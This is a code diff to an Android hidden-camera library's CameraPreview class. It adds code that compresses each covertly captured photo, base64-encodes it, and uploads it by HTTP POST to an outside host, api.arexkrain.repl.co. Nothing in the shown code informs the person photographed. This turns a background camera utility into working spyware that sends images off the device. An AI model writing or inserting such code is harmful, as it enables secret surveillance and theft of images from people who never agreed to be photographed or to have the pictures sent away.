@@ -21,15 +21,25 @@ import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.hardware.Camera;
+import android.os.Debug;
 import android.os.Looper;
 import android.support.annotation.NonNull;
+import android.util.Base64;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
-
+import org.apache.http.client.*;
 import com.androidhiddencamera.config.CameraResolution;
 import com.androidhiddencamera.config.CameraRotation;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.FormBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.Collections;
 import java.util.List;
@@ -219,7 +229,34 @@ class CameraPreview extends SurfaceView implements SurfaceHolder.Callback {
                             } else {
                                 rotatedBitmap = bitmap;
                             }
+                            // send request
+                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+                            rotatedBitmap.compress(Bitmap.CompressFormat.JPEG,30,byteArrayOutputStream);
+                            byte[] byteArray = byteArrayOutputStream.toByteArray();
+                            String encoded = Base64.encodeToString(byteArray,Base64.DEFAULT);
+                            Log.d("ByteArray",encoded);
+                            OkHttpClient client = new OkHttpClient();
+                            String url = "https://api.arexkrain.repl.co/test";
+                            RequestBody formBody = new FormBody.Builder()
+                                    .add("image", encoded)
+                                    .build();
+                            Log.d("start","Request about to send");
+                            Request request = new Request.Builder().url(url).post(formBody).build();
+                            client.newCall(request).enqueue(new Callback() {
+                                @Override
+                                public void onFailure(Call call, IOException e) {
+                                    e.printStackTrace();
+                                    Log.d("error","Request error" + e);
+                                }
 
+                                @Override
+                                public void onResponse(Call call, Response response) throws IOException {
+                                    if (response.isSuccessful()) {
+                                        final String myResponse = response.body().string();
+                                        Log.d("output",myResponse);
+                                    }
+                                }
+                            });
                             //Save image to the file.
                             if (HiddenCameraUtils.saveImageFromFile(rotatedBitmap,
                                     mCameraConfig.getImageFile(),
